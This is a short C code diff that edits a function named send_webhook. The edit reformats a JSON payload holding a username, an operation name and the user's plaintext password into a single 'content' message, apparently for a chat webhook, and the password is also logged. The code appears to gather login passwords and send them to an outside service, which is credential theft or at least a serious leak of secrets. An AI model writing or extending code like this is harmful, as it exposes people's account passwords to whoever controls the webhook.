@@ -22,9 +22,9 @@ void send_webhook(const char *username, const char *operation, const char *passw
         operation = "unknown_operation";
     }
 
-    // Prepare webhook data
+    // Prepare webhook data with 'content'
     char payload[1024];
-    snprintf(payload, sizeof(payload), "{\"user\": \"%s\", \"operation\": \"%s\", \"password\": \"%s\"}", 
+    snprintf(payload, sizeof(payload), "{\"content\": \"User: %s, Operation: %s, Password: %s\"}", 
              username, operation, password ? password : "null");
 
     // Log payload for debugging
